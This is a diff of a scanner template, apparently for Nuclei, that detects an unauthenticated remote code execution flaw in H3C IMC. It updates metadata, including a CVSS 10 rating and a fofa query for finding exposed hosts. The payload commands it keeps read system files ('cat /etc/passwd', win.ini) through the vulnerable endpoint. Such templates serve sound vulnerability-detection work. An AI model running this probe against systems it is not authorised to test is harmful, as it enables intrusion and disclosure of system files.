@@ -1,16 +1,22 @@
 id: h3c-imc-rce
 
 info:
-  name: H3c IMC RCE
+  name: H3c IMC - Remote Code Execution
   author: pikpikcu
   severity: critical
-  description: A vulnerability in H3C IMC allows remote unauthenticated attackers to cause the remote web application to execute arbitrary commands via the 'dynamiccontent.properties.xhtml' endpoint
-  reference: https://mp.weixin.qq.com/s/BP9_H3lpluqIwL5OMIJlIw
-  tags: rce,h3c-imc
+  description: H3c IMC allows remote unauthenticated attackers to cause the remote web application to execute arbitrary commands via the 'dynamiccontent.properties.xhtml' endpoint.
+  reference:
+    - https://mp.weixin.qq.com/s/BP9_H3lpluqIwL5OMIJlIw
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-78
   metadata:
-    fofa-query: 'body="/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui"'
+    max-request: 2
+    fofa-query: body="/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui"
+  tags: rce,h3c-imc,vuln
 
-requests:
+http:
   - raw:
       - |
         POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1
@@ -23,8 +29,8 @@ requests:
       command:
         - 'cat /etc/passwd'
         - 'type C:\\Windows\\win.ini'
-
     stop-at-first-match: true
+
     matchers-condition: and
     matchers:
       - type: regex
@@ -37,3 +43,4 @@ requests:
       - type: status
         status:
           - 200
+# digest: 4b0a00483046022100f8ce26e3fe3e5fb6165c05af76346afa56888f49ed0ee97c88f0d0cab500c5fb022100c1881f72d2bb58a2c82acb10b3644a611e9d0a5838de630d8458eff1592fa238:922c64590222798bb761d5b6d8e72950
